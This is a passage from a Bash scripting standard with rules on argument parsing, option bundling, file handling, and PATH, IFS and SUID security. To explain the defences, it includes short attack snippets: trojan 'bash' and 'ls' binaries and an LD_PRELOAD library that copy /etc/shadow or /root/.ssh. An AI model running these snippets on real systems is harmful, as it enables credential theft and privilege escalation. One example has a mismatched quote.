See BCS04XX for `${parameter@Q}` shell quoting operator details.


---


**Rule: BCS0804**

## Argument Parsing Location

**Recommendation:** Place argument parsing inside `main()` rather than at top level.

**Benefits:** Better testability, cleaner variable scoping (parsing vars local to `main()`), encapsulation, easier unit testing.

```bash
# Recommended: Parsing inside main()
main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
      --prefix)     shift
                    PREFIX=$1
                    # Update derived paths
                    BIN_DIR="$PREFIX"/bin
                    LOADABLE_DIR="$PREFIX"/lib/bash/loadables
                    ;;
      -h|--help)    show_help
                    exit 0
                    ;;
      -*)           die 22 "Invalid option ${1@Q}"
                    ;;
      *)            >&2 show_help
                    die 2 "Unknown option ${1@Q}"
                    ;;
    esac
    shift
  done

  # Proceed with main logic
  check_prerequisites
  build_components
  install_components
}

main "$@"
#fin
```

**Alternative:** For simple scripts (<200 lines) without `main()`, top-level parsing is acceptable:

```bash
#!/bin/bash
set -euo pipefail

# Simple scripts can parse at top level
while (($#)); do case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option ${1@Q}" ;;
  *)            FILES+=("$1") ;;
esac; shift; done

# Rest of simple script logic
```


---


**Rule: BCS0805**

## Short-Option Disaggregation in Command-Line Processing

## Overview

Short-option disaggregation splits bundled options (`-abc`) into individual options (`-a -b -c`), enabling Unix-standard commands like `script -vvn` instead of `script -v -v -n`.

## The Three Methods

### Method 1: grep (Current Standard)

```bash
-[amLpvqVh]*) #shellcheck disable=SC2046 #split up aggregated short options
  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
  ;;
```

**Performance:** ~190 iter/sec | Requires external `grep`, SC2046 disable

### Method 2: fold (Alternative)

```bash
-[amLpvqVh]*) #shellcheck disable=SC2046
  set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}"
  ;;
```

**Performance:** ~195 iter/sec (+2.3%) | Still requires external command

### Method 3: Pure Bash (Recommended)

```bash
-[amLpvqVh]*) # Split up single options (pure bash)
  local -- opt=${1:1}
  local -a new_args=()
  while ((${#opt})); do
    new_args+=("-${opt:0:1}")
    opt=${opt:1}
  done
  set -- '' "${new_args[@]}" "${@:2}"
  ;;
```

**Performance:** ~318 iter/sec (**+68%**) | No external deps, no shellcheck warnings

## Performance Comparison

| Method | Iter/Sec | Speed | External Deps | Shellcheck |
|--------|----------|-------|---------------|------------|
| grep | 190.82 | Baseline | grep | SC2046 |
| fold | 195.25 | +2.3% | fold | SC2046 |
| **Pure Bash** | **317.75** | **+66.5%** | **None** | **Clean** |

## Complete Implementation Example (Pure Bash)

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0
declare -i PARALLEL=1
declare -- mode='normal'
declare -a targets=()

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] TARGET...

Options:
  -m, --mode MODE    Processing mode (normal|fast|safe)
  -j, --parallel N   Number of parallel jobs (default: 1)
  -v, --verbose      Verbose output (stackable)
  -q, --quiet        Quiet mode
  -V, --version      Show version
  -h, --help         Show this help
EOF
}

main() {
  while (($#)); do case $1 in
    -m|--mode)      noarg "$@"; shift; mode=$1 ;;
    -j|--parallel)  noarg "$@"; shift; PARALLEL=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling (pure bash)
    -[mjvqVh]*) local -- opt=${1:1}
                local -a new_args=()
                while ((${#opt})); do
                  new_args+=("-${opt:0:1}")
                  opt=${opt:1}
                done
                set -- '' "${new_args[@]}" "${@:2}" ;;
    -*)         die 22 "Invalid option '$1'" ;;
    *)          targets+=("$1") ;;
  esac; shift; done

  readonly -- VERBOSE PARALLEL mode
  readonly -a targets

  ((${#targets[@]} > 0)) || die 2 'No targets specified'
  [[ "$mode" =~ ^(normal|fast|safe)$ ]] || die 2 "Invalid mode: '$mode'"
}

main "$@"
#fin
```

## Edge Cases

### Options Requiring Arguments

Options with arguments cannot be in middle of bundle:

```bash
# ✓ Correct - option with argument at end or separate
./script -vno output.txt file.txt    # -v -n -o output.txt
./script -vn -o output.txt file.txt

# ✗ Wrong - option with argument in middle
./script -von output.txt file.txt    # -o captures "n" as argument!
```

### Character Set Validation

Pattern `-[amLpvqVh]*` explicitly lists valid options:
- Prevents incorrect disaggregation of unknown options
- Unknown options caught by `-*)` case
- Documents valid short options

```bash
./script -xyz  # Doesn't match pattern �' "Invalid option '-xyz'"
```

### Special Characters

All methods handle correctly: `-123` �' `-1 -2 -3`, `-v1n2` �' `-v -1 -n -2`

## Anti-Patterns

```bash
# ✗ Missing character set validation
-*)  # Catches everything including valid bundled options

# ✗ Placing disaggregation after invalid option catch
-*)             die 22 "Invalid option" ;;
-[ovnVh]*)      ...  # Never reached!

# ✗ Options with args in middle of bundle
./script -ovn output.txt  # -o captures "v" as value

# ✗ Using grep/fold when performance matters
# 68% slower than pure bash for frequently-called scripts
```

## Implementation Checklist

- [ ] List valid short options in pattern: `-[ovnVh]*`
- [ ] Place disaggregation case before `-*)` invalid option case
- [ ] Ensure `shift` happens at end of loop
- [ ] Document options-with-arguments bundling limitations
- [ ] Add shellcheck disable for grep/fold methods
- [ ] Test: single, bundled, mixed long/short, stacking (`-vvv`)

## Recommendations

**New Scripts:** Use pure bash method for 68% performance improvement, no external dependencies, no shellcheck warnings.

**Existing Scripts:** Keep grep unless performance critical, frequently called, or running in restricted environments.

**High-Performance Scripts:** Always use pure bash for scripts called in tight loops, build systems, interactive tools, or containers.

#fin


---


**Rule: BCS0900**

# File Operations

This section establishes safe file handling practices to prevent common shell scripting pitfalls. Covers proper file testing operators (`-e`, `-f`, `-d`, `-r`, `-w`, `-x`) with explicit quoting, safe wildcard expansion using explicit paths (`rm ./*` never `rm *`), process substitution (`< <(command)`) to avoid subshell variable issues, and here document patterns for multi-line input. These defensive practices prevent accidental deletion, handle special characters safely, and ensure reliable operations across environments.


---


**Rule: BCS0901**

## Safe File Testing

**Always quote variables and use `[[ ]]` for file tests:**

```bash
[[ -f "$file" ]] && source "$file"
[[ -d "$path" ]] || die 1 "Not a directory ${path@Q}"
[[ -r "$file" ]] || warn "Cannot read ${file@Q}"
[[ -x "$script" ]] || die 1 "Not executable ${script@Q}"

# Multiple conditions
if [[ -f "$config" && -r "$config" ]]; then
  source "$config"
else
  die 3 "Config file not found or not readable ${config@Q}"
fi

# File timestamps
[[ "$source" -nt "$destination" ]] && cp "$source" "$destination"
```

**File test operators:**

| Operator | True If | Operator | True If |
|----------|---------|----------|---------|
| `-e file` | Exists (any type) | `-r file` | Readable |
| `-f file` | Regular file | `-w file` | Writable |
| `-d dir` | Directory | `-x file` | Executable |
| `-L link` | Symbolic link | `-s file` | Non-empty (size > 0) |
| `-p pipe` | Named pipe | `-O file` | You own it |
| `-S sock` | Socket | `-G file` | Group matches yours |
| `-b/-c` | Block/char device | `-N file` | Modified since last read |
| `-u/-g/-k` | SUID/SGID/sticky | | |

**Comparison:** `-nt` (newer), `-ot` (older), `-ef` (same inode)

**Rationale:**
- Quote `"$file"` to prevent word splitting/glob expansion
- `[[ ]]` more robust than `[ ]`
- Test before use, fail fast with `|| die`
- Include filename in error messages

**Common patterns:**

```bash
validate_file() {
  local file=$1
  [[ -f "$file" ]] || die 2 "File not found ${file@Q}"
  [[ -r "$file" ]] || die 5 "Cannot read file ${file@Q}"
}

ensure_writable_dir() {
  local dir=$1
  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory ${dir@Q}"
  [[ -w "$dir" ]] || die 5 "Directory not writable ${dir@Q}"
}

is_executable_script() {
  local file=$1
  [[ -f "$file" && -x "$file" && -s "$file" ]]
}
```

**Anti-patterns:**

```bash
# ✗ Wrong - unquoted variable (breaks with spaces/special chars)
[[ -f $file ]]
# ✓ Correct
[[ -f "$file" ]]

# ✗ Wrong - old [ ] syntax
if [ -f "$file" ]; then
# ✓ Correct
if [[ -f "$file" ]]; then

# ✗ Wrong - not checking before use
source "$config"
# ✓ Correct - validate first
[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
source "$config"

# ✗ Wrong - mkdir failure not caught
[[ -d "$dir" ]] || mkdir "$dir"
# ✓ Correct
[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: ${dir@Q}"
```


---


**Rule: BCS0902**

## Wildcard Expansion
Always use explicit path with wildcards to prevent filenames starting with `-` from being interpreted as flags.

```bash
# ✓ Correct - explicit path prevents flag interpretation
rm -v ./*
for file in ./*.txt; do
  process "$file"
done

# ✗ Incorrect - filenames starting with - become flags
rm -v *
```


---


**Rule: BCS0903**

## Process Substitution

**Use `<(command)` and `>(command)` to provide command output as file-like inputs or send data as if writing to files. Eliminates temp files, avoids subshell issues, enables parallel processing.**

**Rationale:**
- **No Temporary Files**: Eliminates temp file creation/cleanup overhead
- **Avoid Subshells**: Unlike pipes to while, preserves variable scope
- **Parallelism**: Multiple process substitutions run simultaneously
- **Resource Efficiency**: Data streams through FIFOs without disk I/O

**How it works:**

```bash
# <(command) - Input: creates /dev/fd/NN containing command's stdout
# >(command) - Output: creates /dev/fd/NN piping to command's stdin

diff <(sort file1) <(sort file2)
# Expands to: diff /dev/fd/63 /dev/fd/64
```

**Basic patterns:**

```bash
# Input process substitution <(command)
diff <(ls dir1) <(ls dir2)
cat <(echo "Header") <(cat data.txt) <(echo "Footer")
paste <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)

# Output process substitution >(command)
command | tee >(wc -l) >(grep ERROR) > output.txt
echo "data" > >(base64)
```

**Critical use cases:**

**1. Reading into arrays (avoids subshell):**

```bash
# ✓ BEST - readarray with process substitution
declare -a users
readarray -t users < <(getent passwd | cut -d: -f1)

# ✓ Null-delimited for filenames with special chars
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**2. While loops preserving variables:**

```bash
# ✓ CORRECT - Process substitution (no subshell)
declare -i count=0
while IFS= read -r line; do
  ((count+=1))
done < <(cat file.txt)
echo "Count: $count"  # Correct value!
```

**3. Comparing command outputs:**

```bash
diff <(ssh host1 cat /etc/config) <(ssh host2 cat /etc/config)
diff <(jq -S . file1.json) <(jq -S . file2.json)
```

**4. Parallel processing with tee:**

```bash
cat logfile.txt | tee \
  >(grep ERROR > errors.log) \
  >(grep WARN > warnings.log) \
  >(wc -l > line_count.txt) \
  > all_output.log
```

**5. Multiple simultaneous inputs:**

```bash
while IFS= read -r line1 <&3 && IFS= read -r line2 <&4; do
  echo "File1: ${line1@Q}  File2: ${line2@Q}"
done 3< <(cat file1.txt) 4< <(cat file2.txt)

sort -m <(sort file1) <(sort file2) <(sort file3)
```

**Complete example - Data merging:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

merge_user_data() {
  local -- source1=$1 source2=$2
  local -a users1 users2 common only1 only2

  readarray -t users1 < <(cut -d: -f1 "$source1" | sort -u)
  readarray -t users2 < <(cut -d: -f1 "$source2" | sort -u)

  readarray -t common < <(comm -12 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))
  readarray -t only1 < <(comm -23 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))
  readarray -t only2 < <(comm -13 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  info "Common: ${#common[@]}, Only source1: ${#only1[@]}, Only source2: ${#only2[@]}"
}

main() { merge_user_data '/etc/passwd' '/backup/passwd'; }
main "$@"
#fin
```

**Anti-patterns:**

```bash
# ✗ Wrong - temp files instead of process substitution
temp1=$(mktemp); temp2=$(mktemp)
sort file1 > "$temp1"; sort file2 > "$temp2"
diff "$temp1" "$temp2"; rm "$temp1" "$temp2"
# ✓ Correct
diff <(sort file1) <(sort file2)

# ✗ Wrong - pipe to while (subshell, count stays 0)
declare -i count=0
cat file | while read -r line; do count+=1; done
echo "$count"  # Still 0!
# ✓ Correct
while read -r line; do count+=1; done < <(cat file)

# ✗ Wrong - sequential file reads (3x I/O)
cat log | grep ERROR > errors.txt
cat log | grep WARN > warnings.txt
cat log | wc -l > count.txt
# ✓ Correct - single read, parallel processing
cat log | tee >(grep ERROR > errors.txt) >(grep WARN > warnings.txt) >(wc -l > count.txt) > /dev/null

# ✗ Wrong - unquoted variables
diff <(sort $file1) <(sort $file2)
# ✓ Correct
diff <(sort "$file1") <(sort "$file2")

# ✗ Wrong - no error handling
diff <(failing_command) file  # Empty input on failure
# ✓ Correct
if temp=$(failing_command); then diff <(echo "$temp") file; else die 1 'Failed'; fi
```

**Edge cases:**

**1. File descriptor assignment:**

```bash
exec 3< <(long_running_command)
while IFS= read -r line <&3; do echo "$line"; done
exec 3<&-  # Close when done
```

**2. NULL-delimited processing:**

```bash
while IFS= read -r -d '' file; do
  echo "Processing: $file"
done < <(find /data -type f -print0)
```

**3. Nested process substitution:**

```bash
diff <(sort <(grep pattern file1)) <(sort <(grep pattern file2))
```

**When NOT to use:**

```bash
# ✗ Overcomplicated - use command substitution
result=$(cat <(command))
# ✓ Simpler
result=$(command)

# ✗ Overcomplicated - use direct redirection
grep pattern < <(cat file)
# ✓ Simpler
grep pattern file

# ✗ Overcomplicated - use here-string for variables
command < <(echo "$variable")
# ✓ Simpler
command <<< "$variable"
```

**Key principle:** Process substitution treats command output as files—more efficient than temp files, safer than pipes (no subshell), enables powerful data processing. When creating temp files just to pass data between commands, process substitution is almost always better.


---


**Rule: BCS0904**

## Here Documents

Use for multi-line strings or input.

```bash
# No variable expansion (note single quotes)
cat <<'EOF'
This is a multi-line
string with no variable
expansion.
EOF

# With variable expansion
cat <<EOF
User: $USER
Home: $HOME
EOF
```


---


**Rule: BCS0905**

## Input Redirection vs Cat: Performance Optimization

Replace `cat filename` with `< filename` redirection to eliminate process fork overhead. Provides 3-100x speedup.

## Performance Comparison

| Scenario | `cat` | `< file` | Speedup |
|----------|-------|----------|---------|
| Output to /dev/null (1000 iter) | 0.792s | 0.234s | **3.4x** |
| Command substitution (1000 iter) | 0.965s | 0.009s | **107x** |
| Large file (500 iter) | 0.398s | 0.115s | **3.5x** |

**Why:** `cat` requires fork�'exec�'load�'read�'wait�'cleanup (7 steps). Redirection: open�'read�'close (3 steps). Command substitution `$(< file)` has zero external processes.

## When to Use `< filename`

### Command Substitution (107x speedup)

```bash
# RECOMMENDED - Zero external processes
content=$(< file.txt)
config=$(< /etc/app.conf)

# AVOID - 100x slower
content=$(cat file.txt)
```

### Single Input to Command (3-4x speedup)

```bash
# RECOMMENDED
grep "pattern" < file.txt
while read line; do ...; done < file.txt
jq '.field' < data.json

# AVOID - Wastes a cat process
cat file.txt | grep "pattern"
cat data.json | jq '.field'
```

### Loop Optimization (cumulative gains)

```bash
# RECOMMENDED
for file in *.json; do
    data=$(< "$file")
    process "$data"
done

# AVOID - Forks cat thousands of times
for file in *.json; do
    data=$(cat "$file")
done
```

## When NOT to Use `< filename`

| Scenario | Why | Use Instead |
|----------|-----|-------------|
| Multiple files | Invalid syntax | `cat file1 file2` |
| Need cat options | No `-n`, `-A`, etc. | `cat -n file` |
| Direct output | `< file` alone produces nothing | `cat file` |
| Concatenation | Cannot combine sources | `cat f1 f2 f3` |

### Invalid Usage

```bash
# WRONG - Does nothing (no command to consume stdin)
< /tmp/test.txt

# WRONG - Invalid syntax
< file1.txt file2.txt

# RIGHT - Must use cat for multiple files
cat file1.txt file2.txt
```

## Technical Details

The `<` operator is a **redirection operator**, not a command. It opens a file on stdin but requires a command to consume input.

**Exception:** Command substitution `$(< file)` - bash reads file directly into variable.

## Real-World Example

**Before (400 forks for 100 files):**
```bash
for logfile in /var/log/app/*.log; do
    content=$(cat "$logfile")
    errors=$(cat "$logfile" | grep -c ERROR)
    warnings=$(cat "$logfile" | grep WARNING)
done
```

**After (100 forks eliminated per file):**
```bash
for logfile in /var/log/app/*.log; do
    content=$(< "$logfile")
    errors=$(grep -c ERROR < "$logfile")
    warnings=$(grep WARNING < "$logfile")
done
```

## Recommendation

**SHOULD use `< filename`:**
- Command substitution: `var=$(< file)`
- Single file input: `cmd < file`
- Loops with file reads

**MUST use `cat`:**
- Multiple file arguments
- Using options `-n`, `-b`, `-E`, `-T`, `-s`, `-v`

## Testing

```bash
# Command substitution speedup
time for i in {1..1000}; do content=$(cat /tmp/test.txt); done  # ~0.8-1.0s
time for i in {1..1000}; do content=$(< /tmp/test.txt); done    # ~0.01s

# Pipeline speedup
time for i in {1..500}; do cat /tmp/numbers.txt | wc -l > /dev/null; done  # ~0.4s
time for i in {1..500}; do wc -l < /tmp/numbers.txt > /dev/null; done      # ~0.1s
```

## See Also

- ShellCheck SC2002 (useless cat)
- Bash manual: Redirections


---


**Rule: BCS1000**

# Security Considerations

This section establishes security-first practices for production bash scripts, covering five critical areas: SUID/SGID prohibition (privilege escalation prevention), PATH security (command hijacking prevention), IFS safety (word-splitting vulnerability prevention), `eval` restrictions (injection risk mitigation), and input sanitization (validation and cleaning patterns). These practices prevent privilege escalation, command injection, path traversal, and other common attack vectors.


---


**Rule: BCS1001**

## SUID/SGID

**Never use SUID or SGID bits on Bash scripts. This is a critical security prohibition with no exceptions.**

```bash
# ✗ NEVER do this - catastrophically dangerous
chmod u+s /usr/local/bin/myscript.sh  # SUID
chmod g+s /usr/local/bin/myscript.sh  # SGID

# ✓ Correct - use sudo for elevated privileges
sudo /usr/local/bin/myscript.sh

# ✓ Correct - configure sudoers for specific commands
# In /etc/sudoers:
# username ALL=(ALL) NOPASSWD: /usr/local/bin/myscript.sh
```

**Rationale:**

- **IFS Exploitation**: Attacker can set `IFS` to control word splitting with elevated privileges
- **PATH Manipulation**: Kernel uses caller's `PATH` to find interpreter, allowing trojan attacks
- **Library Injection**: `LD_PRELOAD`/`LD_LIBRARY_PATH` inject malicious code before script execution
- **Shell Expansion**: Multiple Bash expansions (brace, tilde, parameter, command, glob) can be exploited
- **Race Conditions**: TOCTOU vulnerabilities in file operations
- **Interpreter Vulnerabilities**: Bash bugs exploitable when running with elevated privileges
- **No Compilation**: Script source readable and modifiable, increasing attack surface

**Why dangerous:** For shell scripts, the kernel executes the interpreter with SUID/SGID privileges, then the interpreter processes the script—this multi-step process creates attack vectors that don't exist for compiled programs.

**Attack Examples:**

**1. PATH Attack (interpreter resolution):**

```bash
# SUID script: /usr/local/bin/backup.sh (owned by root)
#!/bin/bash
set -euo pipefail
PATH=/usr/bin:/bin  # Script sets secure PATH
tar -czf /backup/data.tar.gz /var/data
```

Attack:
```bash
# Attacker creates malicious bash
mkdir /tmp/evil
cat > /tmp/evil/bash << 'EOF'
#!/bin/bash
cp -r /root/.ssh /tmp/stolen_keys  # Malicious action
exec /bin/bash "$@"                # Then execute real script
EOF
chmod +x /tmp/evil/bash

export PATH=/tmp/evil:$PATH
/usr/local/bin/backup.sh
# Kernel uses caller's PATH - attacker's code runs as root BEFORE script's PATH is set
```

**2. Library Injection Attack:**

```bash
# Attacker creates malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    if (geteuid() == 0) {
        system("cp /etc/shadow /tmp/shadow_copy");
        system("chmod 644 /tmp/shadow_copy");
    }
}
EOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh
# Malicious library runs with root privileges before the script
```

**3. Symlink Race Condition:**

```bash
# Vulnerable SUID script
#!/bin/bash
set -euo pipefail
output_file=$1

if [[ -f "$output_file" ]]; then
  die 1 "File ${output_file@Q} already exists'
fi
# Race condition window here!
echo "secret data" > "$output_file"
```

Attack: Attacker creates symlink to `/etc/passwd` between check and write.

**Safe Alternatives:**

**1. Use sudo with configured permissions:**
```bash
# /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/myapp.sh
%admin ALL=(root) /usr/local/bin/backup.sh --backup-only
```

**2. Use capabilities (compiled programs only):**
```bash
setcap cap_net_bind_service=+ep /usr/local/bin/myserver
```

**3. Use a setuid wrapper (compiled C):**
```bash
int main(int argc, char *argv[]) {
    if (argc != 2) return 1;
    setenv("PATH", "/usr/bin:/bin", 1);
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("IFS");
    execl("/usr/local/bin/backup.sh", "backup.sh", argv[1], NULL);
    return 1;
}
```

**4. Use systemd service:**
```bash
# /etc/systemd/system/myapp.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/myapp.sh
```

**Detection:**

```bash
# Find SUID/SGID scripts (should return nothing!)
find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \; | grep -i script

# In deployment, explicitly ensure no SUID:
install -m 755 myscript.sh /usr/local/bin/
```

**Why sudo is safer:** Provides logging, timeout, granular control, environment sanitization, and audit trail.

**Key principle:** If you think you need SUID on a shell script, you're solving the wrong problem. Redesign using sudo, PolicyKit, systemd services, or a compiled wrapper.


---


**Rule: BCS1002**

## PATH Security

**Always secure the PATH variable to prevent command substitution attacks and trojan binary injection.**

**Rationale:**
- Command hijacking: Attacker-controlled directories allow malicious binaries to replace system commands
- Current directory risk: `.` or empty elements execute from current directory
- Privilege escalation: Scripts with elevated privileges execute attacker code
- Environment inheritance: PATH inherited from caller may be malicious

**Lock down PATH at script start:**

```bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - set secure PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
```

**Alternative: Validate existing PATH:**

```bash
# ✓ Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory'
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element'
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element'
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element'
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp'
```

**Attack Example: Current Directory in PATH**

```bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOF'
#!/bin/bash
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
/bin/ls "$@"
EOF
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH
# Script executes /tmp/ls instead of /bin/ls
```

**Pattern 1: Complete lockdown (recommended):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH
```

**Pattern 2: Full command paths (maximum security):**

```bash
# Don't rely on PATH at all - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/bin/rm -rf /tmp/workdir
```

**Pattern 3: PATH validation with fallback:**

```bash
validate_path() {
  if [[ "$PATH" =~ \\.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}

validate_path
```

**Pattern 4: Command verification:**

```bash
verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path

  actual_path=$(command -v "$cmd")

  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

verify_command tar /bin/tar
verify_command rm /bin/rm
```

**Anti-patterns:**

```bash
# ✗ Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
# No PATH setting - inherits from environment
ls /etc  # Could execute trojan ls

# ✗ Wrong - PATH includes current directory
export PATH=.:$PATH

# ✗ Wrong - PATH includes /tmp
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin

# ✗ Wrong - empty elements in PATH
export PATH=/usr/local/bin::/usr/bin:/bin  # :: is current directory
export PATH=:/usr/local/bin:/usr/bin:/bin  # Leading : is current directory
export PATH=/usr/local/bin:/usr/bin:/bin:  # Trailing : is current directory

# ✗ Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
whoami   # Uses inherited PATH (dangerous!)
hostname
export PATH='/usr/bin:/bin'  # Too late!

# ✓ Correct - set PATH at top of script
#!/bin/bash
set -euo pipefail
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
```

**Edge case: Scripts that need custom paths:**

```bash
#!/bin/bash
set -euo pipefail

# Start with secure base PATH
readonly BASE_PATH='/usr/local/bin:/usr/bin:/bin'
readonly APP_PATH='/opt/myapp/bin'

# Combine with secure base first
export PATH="$BASE_PATH:$APP_PATH"
readonly PATH

# Validate application path exists and is not world-writable
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist ${APP_PATH@Q}"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable ${APP_PATH@Q}"
```

**Special consideration: Sudo and PATH:**

```bash
# When using sudo, PATH is reset by default via secure_path
# /etc/sudoers: Defaults secure_path="/usr/local/sbin:..."

# ✓ Safe - sudo uses secure_path
sudo /usr/local/bin/backup.sh

# ✗ Don't configure: Defaults env_keep += "PATH"

# ✓ Correct - script sets its own PATH regardless
# Even if sudo preserves PATH, script overwrites it
```

**PATH security check function:**

```bash
check_path_security() {
  local -a issues=()

  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)')
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element')
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)')
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element')
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp')

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    local issue
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi

  return 0
}

check_path_security || die 1 'PATH security validation failed'
```

**Summary:**
- **Always set PATH** explicitly at script start
- **Use `readonly PATH`** to prevent later modification
- **Never include** `.`, empty elements, `/tmp`, or user directories
- **Use absolute paths** for critical commands as defense in depth
- **Place PATH setting early** - first lines after `set -euo pipefail`

**Key principle:** PATH is trusted implicitly by command execution. An attacker who controls your PATH controls which code runs.


---


**Rule: BCS1003**

## IFS Manipulation Safety

**Never trust or use inherited IFS values. Always protect IFS changes to prevent field splitting attacks and unexpected behavior.**

**Rationale:**
- **Security Vulnerability**: Attackers manipulate IFS in calling environment to exploit unprotected scripts
- **Field Splitting Exploits**: Malicious IFS causes word splitting at unexpected characters
- **Command Injection**: IFS manipulation with unquoted variables enables command execution
- **Global Side Effects**: Changing IFS without restoration breaks subsequent operations

**Understanding IFS:**

IFS (Internal Field Separator) controls word splitting during expansion. Default: `$' \t\n'` (space, tab, newline).

```bash
# Default IFS behavior
IFS=$' \t\n'  # Space, tab, newline (default)
data="one two three"
read -ra words <<< "$data"
# Result: words=("one" "two" "three")

# Custom IFS for CSV parsing
IFS=','
data="apple,banana,orange"
read -ra fruits <<< "$data"
# Result: fruits=("apple" "banana" "orange")
```

**Attack Example: Field Splitting Exploitation**

```bash
# Vulnerable script - doesn't protect IFS
process_files() {
  local -- file_list=$1
  local -a files
  read -ra files <<< "$file_list"  # Vulnerable: IFS could be manipulated
  for file in "${files[@]}"; do
    rm -- "$file"
  done
}

# Attack: attacker sets IFS='/' before calling script
# With IFS='/', read -ra splits on '/' not spaces!
# "temp1.txt temp2.txt" becomes single filename, not two
```

**Safe Pattern 1: One-Line IFS Assignment (Preferred)**

```bash
# ✓ Correct - IFS change applies only to single command
IFS=',' read -ra fields <<< "$csv_data"
# IFS is automatically reset after the read command

IFS=':' read -ra path_dirs <<< "$PATH"
# Most concise and safe pattern for single operations
```

**Safe Pattern 2: Local IFS in Function**

```bash
# ✓ Correct - use local to scope IFS change
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- IFS  # Make IFS local to this function

  IFS=','
  read -ra fields <<< "$csv_data"
  # IFS automatically restored when function returns
}
```

**Safe Pattern 3: Save and Restore IFS**

```bash
# ✓ Correct - save, modify, restore
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- saved_ifs

  saved_ifs="$IFS"
  IFS=','
  read -ra fields <<< "$csv_data"
  IFS="$saved_ifs"  # Restore immediately
}
```

**Safe Pattern 4: Subshell Isolation**

```bash
# ✓ Correct - IFS change isolated to subshell
(
  IFS=','
  some_command || return 1  # Subshell ensures IFS is restored
)
```

**Safe Pattern 5: Explicitly Set IFS at Script Start**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Defend against inherited malicious IFS
IFS=$' \t\n'  # Space, tab, newline (standard default)
readonly IFS  # Prevent modification
export IFS
```

**Edge Cases:**

```bash
